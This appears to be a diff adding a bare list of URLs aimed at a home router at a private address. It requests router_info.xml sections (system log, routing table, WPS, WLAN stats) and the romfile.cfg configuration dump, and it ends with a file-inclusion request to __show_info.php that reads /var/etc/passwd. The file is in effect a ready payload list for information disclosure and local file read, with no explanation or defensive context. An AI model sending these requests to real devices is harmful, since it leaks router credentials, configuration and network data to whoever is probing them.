@@ -1,0 +1,13 @@
+192.168.1.101/router_info.xml?section=system_info
+
+192.168.1.101/router_info.xml?section=system_log
+
+192.168.1.101/router_info.xml?section=routing_table
+
+192.168.1.101/router_info.xml?section=wps
+
+192.168.1.101/router_info.xml?section=wlan_stats
+
+192.168.1.101/romfile.cfg
+
+192.168.1.101/model/__show_info.php?REQUIRE_FILE=%2Fvar%2Fetc%2Fpasswd
